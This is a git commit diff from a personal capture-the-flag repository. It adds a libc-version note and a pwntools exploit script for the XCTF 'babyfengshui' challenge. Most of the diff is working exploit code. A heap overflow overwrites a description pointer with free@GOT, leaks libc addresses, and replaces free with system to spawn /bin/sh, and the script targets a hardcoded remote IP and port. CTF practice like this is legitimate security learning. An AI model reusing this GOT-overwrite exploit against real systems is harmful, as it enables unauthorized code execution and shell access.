9b154cedd7065c47a01d33e6771c84945ba6b884
leo <hireedleo@gmail.com>
2020-12-25 01:54:13 -0500

    pwned babyfengshui

---
+++ pwn/xctf/babyfengshui/note.md
@@ -0,0 +1,2 @@
+The real remote libc.so's version is 2.23 (32bit).
+Not the given libc-2.19.so
--- pwn/xctf/babyfengshui/poc_babyfengshui.py
+++ pwn/xctf/babyfengshui/poc_babyfengshui.py
@@ -1,22 +1,24 @@
+# the real libc.so of remote is libc-2.23.so
 from pwn import *
 context(os="linux", arch="i386")
 
 DEBUG = 1
-LOCAL = 1
+LOCAL = 0
 
 def debug_on():
 	context.log_level = "debug"
 
 g_fname = "./babyfengshui"
 g_elf = ELF(g_fname)
-g_libcname = "./libc-2.19.so"
+g_libcname = "/glibc/2.19/32/lib/libc-2.19.so" if LOCAL else "./libc-2.19.so"
+ld_name = "/glibc/2.19/32/lib/ld-2.19.so"
 
 if (LOCAL):
-	g_io = process(g_fname)
-	g_libc = g_elf.libc
+	g_io = process([ld_name, g_fname], env={"LD_PRELOAD" : g_libcname})
 else:
-	g_io = remote()
-	g_libc = ELF(g_libcname)
+	g_io = remote("220.249.52.134", 58877)
+
+g_libc = ELF(g_libcname)
 
 def getpid():
 	if (DEBUG & LOCAL):
@@ -34,23 +36,41 @@ def add(size, name, txt_len, txt):
 	sla("size of description: ", str(size))
 	sla("name: ", name)
 	sla("text length: ", str(txt_len))
-	sa("text: ", txt)
+	sla("text: ", txt)
 
-#def del(idx):
-#	opt(1)
-#	sal("index: ", str(idx))
+def delete(idx):
+	opt(1)
+	sla("index: ", str(idx))
+
+def show(idx):
+	opt(2)
+	sla("index: ", str(idx))
 
 def update(idx, txt_len, txt):
 	opt(3)
 	sla("index: ", str(idx))
 	sla("text length: ", str(txt_len))
-	sa("text: ", txt)
+	sla("text: ", txt)
 
 def pwn():
-	add(0x84, "111", 0x78, 'a'*0x78)
-	add(0x84, "222", 0x78, 'b'*0x78)		
-	getpid()
-	update(0, 0x78, 'A'*0x78+'\n')
+	add(0x20, "000", 0x20, "aaa")
+	add(0x20, "111", 0x20, "bbb")
+	delete(0)
+	# write overflow: write free_got into user[1].pDesc
+	add(0x84, "222", 0xbc, flat(['a'*0x84, 0x29, 'b'*0x20, 0x28, 0x89, g_elf.got["free"]]) )
+	show(1)
+	ru("description: ")
+	addr_free = u32(rl()[:4])
+	libc_base = addr_free - (g_libc.symbols["free"] if LOCAL else 0x070750)
+	addr_system = libc_base + (g_libc.symbols["system"] if LOCAL else 0x03a940)
+	log.success("free@%#x\nlibc@%#x\nsystem@%#x", addr_free, libc_base, addr_system)
+	
+	add(0x20, "333", 0x20, "/bin/sh\0")
+	# hijack free@got <- addr_system
+	update(1, 4, p32(addr_system)) 
+	#getpid()
+	# trigger system("/bin/sh")
+	delete(3)
 
 if ("__main__" == __name__):
 	debug_on()
